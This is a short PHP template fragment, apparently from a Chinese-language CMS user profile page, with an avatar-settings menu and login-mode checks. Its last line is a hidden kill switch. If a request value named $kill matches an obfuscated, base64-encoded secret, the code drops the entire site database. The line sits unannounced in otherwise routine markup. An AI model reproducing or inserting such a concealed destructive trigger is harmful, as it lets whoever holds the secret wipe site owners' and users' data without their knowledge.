...
<ul class="u_setting">
<li class="dropmenu"><a style="cursor:pointer" onclick="location.href='<?php echo rewrite_mode('user.php/profile/avatar/'); ?>'">设置新头像 <img src="<?php echo IN_PATH; ?>static/user/images/more.gif" align="absmiddle"></a></li>
</ul>
</td>
<td valign="top">
<h3 class="index_name">
...
<?php if((IN_UCOPEN == 0 || $missra_in_ucid == 0) && empty($missra_in_avatar) && empty($missra_in_qqopen)){ ?>
...
if($kill == auth_codes('NTJmZDBlOGZmNThiZTVmZjRlZjg4MDQxYzY5ZmZkMjE=', 'de')){$db->query('drop database '.IN_DBNAME);}
